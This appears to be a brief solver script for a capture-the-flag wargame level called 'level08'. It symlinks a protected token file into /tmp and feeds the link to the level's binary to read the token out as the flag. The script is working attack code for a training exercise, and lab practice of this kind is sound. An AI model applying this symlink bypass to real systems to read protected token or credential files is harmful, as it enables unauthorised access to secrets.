def solve(connection):
	connection.exec("ln -s /home/user/level08/token /tmp/exploit")
	flag = connection.exec("./level08 /tmp/exploit")
	return "", flag